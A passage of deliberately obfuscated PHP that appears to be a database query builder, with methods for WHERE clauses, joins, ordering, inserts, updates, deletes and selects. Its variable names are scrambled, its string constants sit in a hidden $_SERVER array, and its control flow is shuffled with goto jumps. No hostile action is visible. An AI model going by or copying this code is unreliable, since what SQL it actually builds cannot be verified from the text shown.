$aé‚Š¡ãç— = explode($D¼Í ¸£Ù¨[47], $aé‚Š¡ãç—); } if (is_array($aé‚Š¡ãç—)) { $D„‡­õª = array(); foreach ($aé‚Š¡ãç— as $d™¤™À®‚ => $CĞã¬ŠÓ“) { if (!is_numeric($d™¤™À®‚)) { $D„‡­õª[] = $this->parseKey($d™¤™À®‚) . $D¼Í ¸£Ù¨[907] . $this->parseKey($CĞã¬ŠÓ“); } else { $D„‡­õª[] = $this->parseKey($CĞã¬ŠÓ“); } } $eÂŠ™µéòš = implode($D¼Í ¸£Ù¨[47], $D„‡­õª); } elseif (is_string($aé‚Š¡ãç—) && !empty($aé‚Š¡ãç—)) { $eÂŠ™µéòš = $aé‚Š¡ãç—; } else { $eÂŠ™µéòš = $D¼Í ¸£Ù¨[176]; } return $eÂŠ™µéòš; } protected function parseTable($f‹ö•‡‰—ø) { $CíÁ·êŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($f‹ö•‡‰—ø)) { $då’Ôƒá„Í = array(); foreach ($f‹ö•‡‰—ø as $C¶ÁÁÖìÎ => $B÷’šŒÖÄ) { if (!is_numeric($C¶ÁÁÖìÎ)) { $då’Ôƒá„Í[] = $this->parseKey($C¶ÁÁÖìÎ) . $CíÁ·êŠ[50] . $this->parseKey($B÷’šŒÖÄ); } else { $då’Ôƒá„Í[] = $this->parseKey($C¶ÁÁÖìÎ); } } $f‹ö•‡‰—ø = $då’Ôƒá„Í; } elseif (is_string($f‹ö•‡‰—ø)) { if (strstr($f‹ö•‡‰—ø, $CíÁ·êŠ[50])) { return $f‹ö•‡‰—ø; } $f‹ö•‡‰—ø = explode($CíÁ·êŠ[47], $f‹ö•‡‰—ø); array_walk($f‹ö•‡‰—ø, array($this, $CíÁ·êŠ[814])); } return $CíÁ·êŠ[908] . trim(implode($CíÁ·êŠ[909], $f‹ö•‡‰—ø), $CíÁ·êŠ[820]) . $CíÁ·êŠ[908]; } protected function parseWhere($D¬ò±ÀßÃ) { $EœñÃ‰Ó‘Å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bîøÓÔ¯‚« = $EœñÃ‰Ó‘Å[33]; if (is_string($D¬ò±ÀßÃ)) { $bîøÓÔ¯‚« = $D¬ò±ÀßÃ; } else { $déæÔæ²ôî = isset($D¬ò±ÀßÃ[$EœñÃ‰Ó‘Å[910]]) ? strtoupper($D¬ò±ÀßÃ[$EœñÃ‰Ó‘Å[910]]) : $EœñÃ‰Ó‘Å[33]; if (in_array($déæÔæ²ôî, array($EœñÃ‰Ó‘Å[911], $EœñÃ‰Ó‘Å[912], $EœñÃ‰Ó‘Å[913]))) { $déæÔæ²ôî = $EœñÃ‰Ó‘Å[50] . $déæÔæ²ôî . $EœñÃ‰Ó‘Å[50]; unset($D¬ò±ÀßÃ[$EœñÃ‰Ó‘Å[910]]); } else { $déæÔæ²ôî = $EœñÃ‰Ó‘Å[914]; } foreach ($D¬ò±ÀßÃ as $FÓ©àš¹Ó => $CÏ¾íßèî) { $bîøÓÔ¯‚« .= $EœñÃ‰Ó‘Å[265]; if (is_numeric($FÓ©àš¹Ó)) { $FÓ©àš¹Ó = $EœñÃ‰Ó‘Å[915]; } if (0 === strpos($FÓ©àš¹Ó, $EœñÃ‰Ó‘Å[70])) { $bîøÓÔ¯‚« .= $this->parseThinkWhere($FÓ©àš¹Ó, $CÏ¾íßèî); } else { if (!preg_match($EœñÃ‰Ó‘Å[916], trim($FÓ©àš¹Ó))) { think_exception(think_lang($EœñÃ‰Ó‘Å[917]) . $EœñÃ‰Ó‘Å[4] . $FÓ©àš¹Ó); } $d•­öô¿¸‚ = is_array($CÏ¾íßèî) && isset($CÏ¾íßèî[$EœñÃ‰Ó‘Å[918]]); $FÓ©àš¹Ó = trim($FÓ©àš¹Ó); if (strpos($FÓ©àš¹Ó, $EœñÃ‰Ó‘Å[271])) { $CÄ½›Í—‰ = explode($EœñÃ‰Ó‘Å[271], $FÓ©àš¹Ó); $A´ŒÂ¹“î§ = array(); foreach ($CÄ½›Í—‰ as $dƒö½øäŠù => $B†ÕÜùğĞ¿) { $A„Çì£¯é« = $d•­öô¿¸‚ ? $CÏ¾íßèî[$dƒö½øäŠù] : $CÏ¾íßèî; $A´ŒÂ¹“î§[] = $EœñÃ‰Ó‘Å[248] . $this->parseWhereItem($this->parseKey($B†ÕÜùğĞ¿), $A„Çì£¯é«) . $EœñÃ‰Ó‘Å[813]; } $bîøÓÔ¯‚« .= implode($EœñÃ‰Ó‘Å[919], $A´ŒÂ¹“î§); } elseif (strpos($FÓ©àš¹Ó, $EœñÃ‰Ó‘Å[272])) { $CÄ½›Í—‰ = explode($EœñÃ‰Ó‘Å[272], $FÓ©àš¹Ó); $A´ŒÂ¹“î§ = array(); foreach ($CÄ½›Í—‰ as $dƒö½øäŠù => $B†ÕÜùğĞ¿) { $A„Çì£¯é« = $d•­öô¿¸‚ ? $CÏ¾íßèî[$dƒö½øäŠù] : $CÏ¾íßèî; $A´ŒÂ¹“î§[] = $EœñÃ‰Ó‘Å[248] . $this->parseWhereItem($this->parseKey($B†ÕÜùğĞ¿), $A„Çì£¯é«) . $EœñÃ‰Ó‘Å[813]; } $bîøÓÔ¯‚« .= implode($EœñÃ‰Ó‘Å[914], $A´ŒÂ¹“î§); } else { $bîøÓÔ¯‚« .= $this->parseWhereItem($this->parseKey($FÓ©àš¹Ó), $CÏ¾íßèî); } } $bîøÓÔ¯‚« .= $EœñÃ‰Ó‘Å[266] . $déæÔæ²ôî; } $bîøÓÔ¯‚« = substr($bîøÓÔ¯‚«, 0, -strlen($déæÔæ²ôî)); } return empty($bîøÓÔ¯‚«) ? $EœñÃ‰Ó‘Å[33] : $EœñÃ‰Ó‘Å[920] . $bîøÓÔ¯‚«; } protected function parseWhereItem($a¥”Å‘¦Ö, $FÆÉ§õâµ) { $bÃİõİ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Aìğì’¼ = $bÃİõİ–[33]; if (is_array($FÆÉ§õâµ)) { if (is_string($FÆÉ§õâµ[0])) { $Aòå¹¾¾éİ = strtolower($FÆÉ§õâµ[0]); if (in_array($FÆÉ§õâµ[0], array($bÃİõİ–[903], $bÃİõİ–[921], $bÃİõİ–[922], $bÃİõİ–[923], $bÃİõİ–[924], $bÃİõİ–[925]))) { $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[50] . $FÆÉ§õâµ[0] . $bÃİõİ–[50] . $this->parseValue($FÆÉ§õâµ[1]); } elseif (preg_match($bÃİõİ–[926], $FÆÉ§õâµ[0])) { $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[50] . $this->parseValue($FÆÉ§õâµ[1]); } elseif (preg_match($bÃİõİ–[927], $FÆÉ§õâµ[0])) { if (is_array($FÆÉ§õâµ[1])) { $d­Â±Ñ»Ñ = isset($FÆÉ§õâµ[2]) ? strtoupper($FÆÉ§õâµ[2]) : $bÃİõİ–[912]; if (in_array($d­Â±Ñ»Ñ, array($bÃİõİ–[911], $bÃİõİ–[912], $bÃİõİ–[913]))) { $b‹ñĞ­ÒÕ™ = array(); foreach ($FÆÉ§õâµ[1] as $E¶¿åôŠè) { $b‹ñĞ­ÒÕ™[] = $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[50] . $this->parseValue($E¶¿åôŠè); } $Aìğì’¼ .= $bÃİõİ–[248] . implode($bÃİõİ–[50] . $d­Â±Ñ»Ñ . $bÃİõİ–[50], $b‹ñĞ­ÒÕ™) . $bÃİõİ–[813]; } } else { $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[50] . $this->parseValue($FÆÉ§õâµ[1]); } } elseif ($bÃİõİ–[285] == $Aòå¹¾¾éİ) { $Aìğì’¼ .= $bÃİõİ–[811] . $a¥”Å‘¦Ö . $bÃİõİ–[50] . $FÆÉ§õâµ[1] . $bÃİõİ–[928]; } elseif (preg_match($bÃİõİ–[929], $FÆÉ§õâµ[0])) { if (isset($FÆÉ§õâµ[2]) && $bÃİõİ–[285] == $FÆÉ§õâµ[2]) { $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[50] . $FÆÉ§õâµ[1]; } else { if (is_string($FÆÉ§õâµ[1])) { $FÆÉ§õâµ[1] = explode($bÃİõİ–[47], $FÆÉ§õâµ[1]); } $F”·§Œ¥§ƒ = implode($bÃİõİ–[47], $this->parseValue($FÆÉ§õâµ[1])); $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[811] . $F”·§Œ¥§ƒ . $bÃİõİ–[813]; } } elseif (preg_match($bÃİõİ–[930], $FÆÉ§õâµ[0])) { $DÀç¥–Á´ƒ = is_string($FÆÉ§õâµ[1]) ? explode($bÃİõİ–[47], $FÆÉ§õâµ[1]) : $FÆÉ§õâµ[1]; $Aìğì’¼ .= $bÃİõİ–[811] . $a¥”Å‘¦Ö . $bÃİõİ–[50] . $this->exp[$Aòå¹¾¾éİ] . $bÃİõİ–[50] . $this->parseValue($DÀç¥–Á´ƒ[0]) . $bÃİõİ–[914] . $this->parseValue($DÀç¥–Á´ƒ[1]) . $bÃİõİ–[266]; } else { think_exception(think_lang($bÃİõİ–[917]) . $bÃİõİ–[4] . $FÆÉ§õâµ[0]); } } else { $a°£ÈŠ…’¾ = count($FÆÉ§õâµ); $aƒÀ˜ˆš› = isset($FÆÉ§õâµ[$a°£ÈŠ…’¾ - 1]) ? strtoupper($FÆÉ§õâµ[$a°£ÈŠ…’¾ - 1]) : $bÃİõİ–[33]; if (in_array($aƒÀ˜ˆš›, array($bÃİõİ–[911], $bÃİõİ–[912], $bÃİõİ–[913]))) { $a°£ÈŠ…’¾ = $a°£ÈŠ…’¾ - 1; } else { $aƒÀ˜ˆš› = $bÃİõİ–[911]; } for ($dÕ×’£´× = 0; $dÕ×’£´× < $a°£ÈŠ…’¾; $dÕ×’£´×++) { $DÀç¥–Á´ƒ = is_array($FÆÉ§õâµ[$dÕ×’£´×]) ? $FÆÉ§õâµ[$dÕ×’£´×][1] : $FÆÉ§õâµ[$dÕ×’£´×]; if ($bÃİõİ–[285] == strtolower($FÆÉ§õâµ[$dÕ×’£´×][0])) { $Aìğì’¼ .= $bÃİõİ–[248] . $a¥”Å‘¦Ö . $bÃİõİ–[50] . $DÀç¥–Á´ƒ . $bÃİõİ–[928] . $aƒÀ˜ˆš› . $bÃİõİ–[50]; } else { $døàÉÁ¦øÓ = is_array($FÆÉ§õâµ[$dÕ×’£´×]) ? $this->exp[strtolower($FÆÉ§õâµ[$dÕ×’£´×][0])] : $bÃİõİ–[903]; if (!$døàÉÁ¦øÓ && is_array($FÆÉ§õâµ[$dÕ×’£´×]) && in_array($FÆÉ§õâµ[$dÕ×’£´×][0], array($bÃİõİ–[903], $bÃİõİ–[921], $bÃİõİ–[922], $bÃİõİ–[923], $bÃİõİ–[924], $bÃİõİ–[925]))) { $døàÉÁ¦øÓ = $FÆÉ§õâµ[$dÕ×’£´×][0]; } $Aìğì’¼ .= $bÃİõİ–[248] . $a¥”Å‘¦Ö . $bÃİõİ–[50] . $døàÉÁ¦øÓ . $bÃİõİ–[50] . $this->parseValue($DÀç¥–Á´ƒ) . $bÃİõİ–[928] . $aƒÀ˜ˆš› . $bÃİõİ–[50]; } } $Aìğì’¼ = substr($Aìğì’¼, 0, -4); } } else { $Aìğì’¼ .= $a¥”Å‘¦Ö . $bÃİõİ–[931] . $this->parseValue($FÆÉ§õâµ); } return $Aìğì’¼; } protected function parseThinkWhere($A§ÏÀâŒ‘¨, $Bª’Ìœ©“¥) { $aß³¬¡Ù˜Œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÅ™—«ƒÊÛ = $aß³¬¡Ù˜Œ[33]; switch ($A§ÏÀâŒ‘¨) { case $aß³¬¡Ù˜Œ[339]: $FÅ™—«ƒÊÛ = $Bª’Ìœ©“¥; break; case $aß³¬¡Ù˜Œ[915]: $FÅ™—«ƒÊÛ = is_string($Bª’Ìœ©“¥) ? $Bª’Ìœ©“¥ : substr($this->parseWhere($Bª’Ìœ©“¥), 6); break; case $aß³¬¡Ù˜Œ[932]: parse_str($Bª’Ìœ©“¥, $F”é‰–Ç†¡); if (isset($F”é‰–Ç†¡[$aß³¬¡Ù˜Œ[910]])) { $dÇ¢¹ÉÆœ = $aß³¬¡Ù˜Œ[50] . strtoupper($F”é‰–Ç†¡[$aß³¬¡Ù˜Œ[910]]) . $aß³¬¡Ù˜Œ[50]; unset($F”é‰–Ç†¡[$aß³¬¡Ù˜Œ[910]]); } else { $dÇ¢¹ÉÆœ = $aß³¬¡Ù˜Œ[914]; } $C×Ôèò§… = array(); foreach ($F”é‰–Ç†¡ as $e²˜çÊÑË‰ => $aíÂ³ˆŸİæ) { $C×Ôèò§…[] = $this->parseKey($e²˜çÊÑË‰) . $aß³¬¡Ù˜Œ[931] . $this->parseValue($aíÂ³ˆŸİæ); } $FÅ™—«ƒÊÛ = implode($dÇ¢¹ÉÆœ, $C×Ôèò§…); break; } return $FÅ™—«ƒÊÛ; } protected function parseLimit($Dë¹«Ìøäç) { $bƒƒÅ…“êî =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return !empty($Dë¹«Ìøäç) ? $bƒƒÅ…“êî[48] . $Dë¹«Ìøäç . $bƒƒÅ…“êî[50] : $bƒƒÅ…“êî[33]; } protected function parseJoin($FïŠ„Ğ‘ãÀ) { $EçµùØÇ²İ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bè¦íè¤‚¸ = $EçµùØÇ²İ[33]; if (!empty($FïŠ„Ğ‘ãÀ)) { if (is_array($FïŠ„Ğ‘ãÀ)) { foreach ($FïŠ„Ğ‘ãÀ as $b–ï‘¯øç => $CÛô…»âŞù) { if (!1 !== stripos($CÛô…»âŞù, $EçµùØÇ²İ[933])) { $bè¦íè¤‚¸ .= $EçµùØÇ²İ[50] . $CÛô…»âŞù; } else { $bè¦íè¤‚¸ .= $EçµùØÇ²İ[934] . $CÛô…»âŞù; } } } else { $bè¦íè¤‚¸ .= $EçµùØÇ²İ[934] . $FïŠ„Ğ‘ãÀ; } } $bè¦íè¤‚¸ = preg_replace($EçµùØÇ²İ[935], think_config($EçµùØÇ²İ[838]) . $EçµùØÇ²İ[936], $bè¦íè¤‚¸); return $bè¦íè¤‚¸; } protected function parseOrder($E¬ì¶ôëÛÆ) { $c»’õ¿Î¶Ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($E¬ì¶ôëÛÆ)) { $eöİÂğ”›‘ = array(); foreach ($E¬ì¶ôëÛÆ as $d”­‰«œ­š => $d§™È¥êŒ) { if (is_numeric($d”­‰«œ­š)) { $eöİÂğ”›‘[] = $this->parseKey($d§™È¥êŒ); } else { $d§™È¥êŒ = in_array(strtoupper(trim($d§™È¥êŒ)), array($c»’õ¿Î¶Ï[937], $c»’õ¿Î¶Ï[938])) ? $c»’õ¿Î¶Ï[50] . $d§™È¥êŒ : $c»’õ¿Î¶Ï[33]; if (preg_match($c»’õ¿Î¶Ï[939], $d”­‰«œ­š)) { $eöİÂğ”›‘[] = $this->parseKey($d”­‰«œ­š) . $d§™È¥êŒ; } else { think_exception($c»’õ¿Î¶Ï[940] . $d”­‰«œ­š); } } } $E¬ì¶ôëÛÆ = implode($c»’õ¿Î¶Ï[47], $eöİÂğ”›‘); } return !empty($E¬ì¶ôëÛÆ) ? $c»’õ¿Î¶Ï[941] . $E¬ì¶ôëÛÆ : $c»’õ¿Î¶Ï[33]; } protected function parseGroup($ağ—ßÏõ•Ø) { $b–Ùâ¶­¬Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return !empty($ağ—ßÏõ•Ø) ? $b–Ùâ¶­¬Ò[942] . $ağ—ßÏõ•Ø : $b–Ùâ¶­¬Ò[33]; } protected function parseHaving($fßÕš¨ëß‹) { $B•åóãÔøí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return !empty($fßÕš¨ëß‹) ? $B•åóãÔøí[943] . $fßÕš¨ëß‹ : $B•åóãÔøí[33]; } protected function parseComment($C…¶ìâ­™) { $f…•¹öğÙ© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return !empty($C…¶ìâ­™) ? $f…•¹öğÙ©[944] . $C…¶ìâ­™ . $f…•¹öğÙ©[945] : $f…•¹öğÙ©[33]; } protected function parseDistinct($bÙÂÛî¤–‹) { $B•„©±ò®ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return !empty($bÙÂÛî¤–‹) ? $B•„©±ò®ì[946] : $B•„©±ò®ì[33]; } protected function parseUnion($e©¤ôÙšÛ) { $BÃŒİŞöğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($e©¤ôÙšÛ)) { return $BÃŒİŞöğ[33]; } if (isset($e©¤ôÙšÛ[$BÃŒİŞöğ[336]])) { $EªÍÓ»»òÒ = $BÃŒİŞöğ[947]; unset($e©¤ôÙšÛ[$BÃŒİŞöğ[336]]); } else { $EªÍÓ»»òÒ = $BÃŒİŞöğ[948]; } foreach ($e©¤ôÙšÛ as $D¼ŞÊá†­) { $a¦è§’ïÆ²[] = $EªÍÓ»»òÒ . (is_array($D¼ŞÊá†­) ? $this->buildSelectSql($D¼ŞÊá†­) : $D¼ŞÊá†­); } return implode($BÃŒİŞöğ[50], $a¦è§’ïÆ²); } public function insert($Cï¶“æÙ†â, $CÀ¡‘„¨† = array(), $F»È²ê‘÷® = false) { goto c÷½š÷Õò; aê°Š»Çò§: $d§—¡¿¹Ú .= $this->parseComment(!empty($CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[341]]) ? $CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[341]] : $dË¯¹ù¡ğ¶[33]); return $this->execute($d§—¡¿¹Ú, $this->parseBind(!empty($CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[273]]) ? $CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[273]] : array())); goto fÁ´éŠ‚®Ø; B¸àÛ¥©·: foreach ($Cï¶“æÙ†â as $c‚¯‘®Çß¬ => $E‡Ê¿„»¾¸) { if (is_array($E‡Ê¿„»¾¸) && $dË¯¹ù¡ğ¶[285] == $E‡Ê¿„»¾¸[0]) { $E×öŠ¹ÆÃ[] = $this->parseKey($c‚¯‘®Çß¬); $c·¨¥‡¾—³[] = $E‡Ê¿„»¾¸[1]; } elseif (is_scalar($E‡Ê¿„»¾¸) || is_null($E‡Ê¿„»¾¸)) { $E×öŠ¹ÆÃ[] = $this->parseKey($c‚¯‘®Çß¬); $c·¨¥‡¾—³[] = $this->parseValue($E‡Ê¿„»¾¸); } } $d§—¡¿¹Ú = ($F»È²ê‘÷® ? $dË¯¹ù¡ğ¶[815] : $dË¯¹ù¡ğ¶[816]) . $dË¯¹ù¡ğ¶[817] . $this->parseTable($CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[267]]) . $dË¯¹ù¡ğ¶[811] . implode($dË¯¹ù¡ğ¶[47], $E×öŠ¹ÆÃ) . $dË¯¹ù¡ğ¶[812] . implode($dË¯¹ù¡ğ¶[47], $c·¨¥‡¾—³) . $dË¯¹ù¡ğ¶[813]; $d§—¡¿¹Ú .= $this->parseLock(isset($CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[773]]) ? $CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[773]] : !1); goto aê°Š»Çò§; c÷½š÷Õò: $dË¯¹ù¡ğ¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c·¨¥‡¾—³ = $E×öŠ¹ÆÃ = array(); $this->model = $CÀ¡‘„¨†[$dË¯¹ù¡ğ¶[269]]; goto B¸àÛ¥©·; fÁ´éŠ‚®Ø: } public function selectInsert($Dó©²ä«Î‡, $bçòôµ¿®÷, $BÒ©ÓÎèº = array()) { goto aâ¨±¢Ì´†; aâ¨±¢Ì´†: $eËàÈŒøà =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->model = $BÒ©ÓÎèº[$eËàÈŒøà[269]]; if (is_string($Dó©²ä«Î‡)) { $Dó©²ä«Î‡ = explode($eËàÈŒøà[47], $Dó©²ä«Î‡); } goto A‘òË¾Á­¼; dÑ‚¬”ºµÕ: return $this->execute($eŸ„Ûö‰£², $this->parseBind(!empty($BÒ©ÓÎèº[$eËàÈŒøà[273]]) ? $BÒ©ÓÎèº[$eËàÈŒøà[273]] : array())); goto AÀšÂ²½; A‘òË¾Á­¼: array_walk($Dó©²ä«Î‡, array($this, $eËàÈŒøà[814])); $eŸ„Ûö‰£² = $eËàÈŒøà[949] . $this->parseTable($bçòôµ¿®÷) . $eËàÈŒøà[811] . implode($eËàÈŒøà[47], $Dó©²ä«Î‡) . $eËàÈŒøà[928]; $eŸ„Ûö‰£² .= $this->buildSelectSql($BÒ©ÓÎèº); goto dÑ‚¬”ºµÕ; AÀšÂ²½: } public function update($e ‡¦¹äŠÅ, $b½¨×ø) { $Bœ”·áµÔÇ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->model = $b½¨×ø[$Bœ”·áµÔÇ[269]]; $F”æ¢½éèƒ = $Bœ”·áµÔÇ[950] . $this->parseTable($b½¨×ø[$Bœ”·áµÔÇ[267]]) . $this->parseSet($e ‡¦¹äŠÅ) . $this->parseWhere(!empty($b½¨×ø[$Bœ”·áµÔÇ[263]]) ? $b½¨×ø[$Bœ”·áµÔÇ[263]] : $Bœ”·áµÔÇ[33]) . $this->parseOrder(!empty($b½¨×ø[$Bœ”·áµÔÇ[350]]) ? $b½¨×ø[$Bœ”·áµÔÇ[350]] : $Bœ”·áµÔÇ[33]) . $this->parseLimit(!empty($b½¨×ø[$Bœ”·áµÔÇ[280]]) ? $b½¨×ø[$Bœ”·áµÔÇ[280]] : $Bœ”·áµÔÇ[33]) . $this->parseLock(isset($b½¨×ø[$Bœ”·áµÔÇ[773]]) ? $b½¨×ø[$Bœ”·áµÔÇ[773]] : !1) . $this->parseComment(!empty($b½¨×ø[$Bœ”·áµÔÇ[341]]) ? $b½¨×ø[$Bœ”·áµÔÇ[341]] : $Bœ”·áµÔÇ[33]); return $this->execute($F”æ¢½éèƒ, $this->parseBind(!empty($b½¨×ø[$Bœ”·áµÔÇ[273]]) ? $b½¨×ø[$Bœ”·áµÔÇ[273]] : array())); } public function delete($aí£õ¸ “… = array()) { $eÖ®ª–Ší =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->model = $aí£õ¸ “…[$eÖ®ª–Ší[269]]; $eÜ™øãÕÚ… = $eÖ®ª–Ší[951] . $this->parseTable($aí£õ¸ “…[$eÖ®ª–Ší[267]]) . $this->parseWhere(!empty($aí£õ¸ “…[$eÖ®ª–Ší[263]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[263]] : $eÖ®ª–Ší[33]) . $this->parseOrder(!empty($aí£õ¸ “…[$eÖ®ª–Ší[350]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[350]] : $eÖ®ª–Ší[33]) . $this->parseLimit(!empty($aí£õ¸ “…[$eÖ®ª–Ší[280]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[280]] : $eÖ®ª–Ší[33]) . $this->parseLock(isset($aí£õ¸ “…[$eÖ®ª–Ší[773]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[773]] : !1) . $this->parseComment(!empty($aí£õ¸ “…[$eÖ®ª–Ší[341]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[341]] : $eÖ®ª–Ší[33]); return $this->execute($eÜ™øãÕÚ…, $this->parseBind(!empty($aí£õ¸ “…[$eÖ®ª–Ší[273]]) ? $aí£õ¸ “…[$eÖ®ª–Ší[273]] : array())); } public function select($b¿‡”‚…ïâ = array()) { goto B©Ø­´ŞØ™; f‹±Ä­†²¸: if ($AƒéïÑòÌÉ && !1 !== $b‘Š¢ËØè¨) { think_cache($c›¸¯îŸæ, $b‘Š¢ËØè¨, $AƒéïÑòÌÉ); } return $b‘Š¢ËØè¨; goto DÎÈéÆ¨˜; B©Ø­´ŞØ™: $eì†¿´æ¨Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->model = $b¿‡”‚…ïâ[$eì†¿´æ¨Æ[269]]; $bœòÄàç¾Š = $this->buildSelectSql($b¿‡”‚…ïâ); goto cµçÈÌ±³Ÿ; cµçÈÌ±³Ÿ: $AƒéïÑòÌÉ = isset($b¿‡”‚…ïâ[$eì†¿´æ¨Æ[337]]) ? $b¿‡”‚…ïâ[$eì†¿´æ¨Æ[337]] : !1; if ($AƒéïÑòÌÉ) { $c›¸¯îŸæ = is_string($AƒéïÑòÌÉ[$eì†¿´æ¨Æ[89]]) ? $AƒéïÑòÌÉ[$eì†¿´æ¨Æ[89]] : $eì†¿´æ¨Æ[952] . md5($bœòÄàç¾Š); $B…‡‹’Ïš = think_cache($c›¸¯îŸæ, $eì†¿´æ¨Æ[33], $AƒéïÑòÌÉ); if (!1 !== $B…‡‹’Ïš) { return $B…‡‹’Ïš; } } $b‘Š¢ËØè¨ = $this->query($bœòÄàç¾Š, $this->parseBind(!empty($b¿‡”‚…ïâ[$eì†¿´æ¨Æ[273]]) ? $b¿‡”‚…ïâ[$eì†¿´æ¨Æ[273]] : array())); goto f‹±Ä­†²¸; DÎÈéÆ¨˜: } public function buildSelectSql($e‚õ½²ïŒ = array()) { goto F³„ÍõÈ—„; D‹‘«éØ×: $C„Œœ‡¡­½ = $this->parseSql($this->selectSql, $e‚õ½²ïŒ); $C„Œœ‡¡­½ .= $this->parseLock(isset($e‚õ½²ïŒ[$aÌ’ØÌö›¤[773]]) ? $e‚õ½²ïŒ[$aÌ’ØÌö›¤[773]] : !1); if (isset($A¢ÔÁíŞ²)) { think_cache($A¢ÔÁíŞ², $C„Œœ‡¡­½); } goto f¾â‰ÇÆ¥¥; f¾â‰ÇÆ¥¥: return $C„Œœ‡¡­½; goto BÈŒãç‰ç; F³„ÍõÈ—„: $aÌ’ØÌö›¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($e‚õ½²ïŒ[$aÌ’ØÌö›¤[340]])) { if (strpos($e‚õ½²ïŒ[$aÌ’ØÌö›¤[340]], $aÌ’ØÌö›¤[47])) { list($cµ¦¬À¼¨ì, $bÎôÍ™®‘Ú) = explode($aÌ’ØÌö›¤[47], $e‚õ½²ïŒ[$aÌ’ØÌö›¤[340]]); } else { $cµ¦¬À¼¨ì = $e‚õ½²ïŒ[$aÌ’ØÌö›¤[340]]; } $cµ¦¬À¼¨ì = $cµ¦¬À¼¨ì ? $cµ¦¬À¼¨ì : 1; $bÎôÍ™®‘Ú = isset($bÎôÍ™®‘Ú) ? $bÎôÍ™®‘Ú : (is_numeric($e‚õ½²ïŒ[$aÌ’ØÌö›¤[280]]) ? $e‚õ½²ïŒ[$aÌ’ØÌö›¤[280]] : 20); $dîí´Ê®— = $bÎôÍ™®‘Ú * ((int) $cµ¦¬À¼¨ì - 1); $e‚õ½²ïŒ[$aÌ’ØÌö›¤[280]] = $dîí´Ê®— . $aÌ’ØÌö›¤[47] . $bÎôÍ™®‘Ú; } if (think_config($aÌ’ØÌö›¤[953])) { $A¢ÔÁíŞ² = $aÌ’ØÌö›¤[954] . md5(serialize($e‚õ½²ïŒ)); $dÏ—¿Î™é½ = think_cache($A¢ÔÁíŞ²); if ($dÏ—¿Î™é½) { return $dÏ—¿Î™é½; } } goto D‹‘«éØ×; BÈŒãç‰ç: } public function parseSql($Aë±ØÛ‘Èâ, $BÀ††ˆ›®… = array()) { $B¨Øå¤•·å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Aë±ØÛ‘Èâ = str_replace(array($B¨Øå¤•·å[955], $B¨Øå¤•·å[956], $B¨Øå¤•·å[957], $B¨Øå¤•·å[958], $B¨Øå¤•·å[959], $B¨Øå¤•·å[960], $B¨Øå¤•·å[961], $B¨Øå¤•·å[962], $B¨Øå¤•·å[963], $B¨Øå¤•·å[964], $B¨Øå¤•·å[965]), array($this->parseTable("{$BÀ††ˆ›®…[$B¨Øå¤•·å[267]]}"), $this->parseDistinct(isset($BÀ††ˆ›®…[$B¨Øå¤•·å[966]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[966]] : !1), $this->parseField(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[261]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[261]] : $B¨Øå¤•·å[176]), $this->parseJoin(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[270]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[270]] : $B¨Øå¤•·å[33]), $this->parseWhere(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[263]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[263]] : $B¨Øå¤•·å[33]), $this->parseGroup(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[967]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[967]] : $B¨Øå¤•·å[33]), $this->parseHaving(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[968]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[968]] : $B¨Øå¤•·å[33]), $this->parseOrder(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[350]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[350]] : 